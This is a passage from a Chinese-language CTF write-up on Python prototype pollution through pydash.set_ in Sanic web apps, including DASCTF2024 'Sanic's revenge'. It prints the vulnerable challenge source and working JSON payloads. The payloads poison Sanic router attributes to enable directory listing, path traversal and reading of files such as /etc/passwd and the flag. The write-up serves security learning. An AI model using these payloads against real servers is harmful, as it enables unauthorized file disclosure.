class="comment">#@app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment">#async def login(request):</span></span><br><span class="line">    <span class="comment">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line">    <span class="comment">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line">        <span class="comment">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line">        <span class="comment">#return text(&quot;login success&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">print</span>(app.router.name_index)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​输出应该接近这样：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/de66f739b68d4092a1c471efee8f4a6b.png#pic_center" alt="在这里插入图片描述"></p><p>​看出来了路由是  <code>&quot;__mp_main__.static&quot;</code> ，之后，就可以直接一把梭了（具体链子怎么找，参考 gxngxngxn 大佬的文章）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​上面的 payload 是开启目录功能。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​这个 payload 是将指定目录污染为根目录，之后访问 /static/ 目录，就能看到根目录下开始的所有文件的文件名了 /</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flag文件名字&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​这个 payload 是用来读 flag 文件的，之后访问 src 路由即可获得 flag。</p><h2 id="dasctf2024夏季挑战赛sanics-revenge"><a class="markdownIt-Anchor" href="#dasctf2024夏季挑战赛sanics-revenge">#</a> [DASCTF2024 夏季挑战赛] Sanic’s revenge</h2><p>​题目给了个附件，下载下来直接开始审：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​一眼不丁真。这个感觉和之前打的题都不一样，因为之前的思路都是污染 <code>__file__</code> 属性，但是这一次似乎不是，并且，pollute 路由还过滤了 parts 和 proc 以及限制 value 不能是列表。</p><p>​这个题我不是很能理解，感觉很逆天，考点主要的是 sanic 框架的漏洞题，先贴一下原理吧，虽然我也不是很明白。</p><p>​首先是根基 static 函数，之后，之后跟进 <code>DirectoryHandler</code>  类，找到了如下两段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">      current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.directory_view:</span><br><span class="line">          <span class="keyword">return</span> self._index(</span><br><span class="line">              self.directory / current, path, request.app.debug</span><br><span class="line">          )</span><br></pre></td></tr></table></figure><p>​当开启了目录功能后，就会进入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self._index(</span><br><span class="line">             self.directory / current, path, request.app.debug</span><br><span class="line">         )</span><br></pre></td></tr></table></figure><p>​这一点很重要，跟进 <code>_index</code>  看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_index</span>(<span class="params">self, location: Path, path: <span class="built_in">str</span>, debug: <span class="built_in">bool</span></span>):</span><br><span class="line">    <span class="comment"># Remove empty path elements, append slash</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;//&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            <span class="string">&quot;/&quot;</span> + <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;p&#125;</span>/&quot;</span> <span class="keyword">for</span> p <span class="keyword">in</span> path.split(<span class="string">&quot;/&quot;</span>) <span class="keyword">if</span> p])</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Render file browser</span></span><br><span class="line">    page = DirectoryPage(self._iter_files(location), path, debug)</span><br><span class="line">    <span class="keyword">return</span> html(page.render())</span><br></pre></td></tr></table></figure><p>​很显然， <code>_index</code>  是一个拼接函数，主要是为了拼接目录的。根据下面这一行，我们又有了可以操作的空间了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br></pre></td></tr></table></figure><p>​发现了啥？这里 path 在被分割的时候有个情况，就是将路径从 base 字符串结尾开始的所有字符串去掉头尾的 <code>'/'</code>  字符后返回，也就是说，当我们把 base 属性污染成指定的字符串之后，后面如果出现了两个点，也就是 <code>..</code>  就说明了 current 返回的字符串可能存在路径穿越。</p><p>​好了， 再回来看看这个题，首先，最好应该先获取完整的源代码，所以这里可以像之前的题一样污染 <code>directory_view</code>  属性打开静态文件目录。payload 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#这个payload不知道为啥访问static目录的时候感觉没啥变化，但是如果加上了像什么/static/etc/passwd之类的文件却能访问到</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/d67ac7ea195d460b8d80bdeb0f7d00a9.png#pic_center" alt="在这里插入图片描述"></p><p>​既然能成，那正常访问 <code>/static/proc/1/cmdline</code> ，发现了重要的东西，就是</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  /start.sh</span><br></pre></td></tr></table></figure><p>​访问 <code> /static/start.sh</code>  之后获得信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [[ -f /flag.sh ]]; then</span><br><span class="line">source /flag.sh</span><br><span class="line">rm -f /flag.sh</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">python3 /app/2Q17A58T9F65y5i8.py</span><br></pre></td></tr></table></figure><p>​找到了文件名了，读取 <code>/static/app/2Q17A58T9F65y5i8.py</code>  看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line">   </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​这儿发现了个可以利用的点，似乎有个可以利用的产生目录穿越的点了，因为生成的 log_dir 变量后面增加了个 <code>..</code>  作为备份：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">    log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">    log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">    log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">    log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">    <span class="comment">#生成日志文件</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="comment">#备份日志文件</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure><p>​不过先访问下机密路由 <code>Wa58a1qEQ59857qQRPPQ</code> ：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag in /app,but you need to find his name！！！</span><br><span class="line">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure><p>​提示很明显了，flag 在 /app 文件夹内。</p><p>​这里似乎有个没用到的看起来很重要的点，先提前随便进行一次个不能成功的污染，比如 key 中存在 parts 字符串。之后访问下这个 <code>adminLook</code>  路由试试:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">drwxrwxrwt 1 root root 57 Jul 21 23:04 .</span><br><span class="line">drwxr-xr-x 1 root root 43 Jul 21 22:49 ..</span><br><span class="line">drwxr-xr-x 2 root root 24 Jul 21 23:04 73ycOr</span><br><span class="line">drwxr-xr-x 2 root root 28 Jul 21 23:04 73ycOr..</span><br><span class="line">drwx------ 2 root root 31 Jul 21 22:49 pymp-zra4pxem</span><br></pre></td></tr></table></figure><p>​可以看到，成功产生了一个结尾两个点的目录，之后就是污染 base 属性进行目录穿越了，payload 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先切换到/tep目录下</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#对base属性进行污染</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/73ycOr&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#打开目录功能</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span 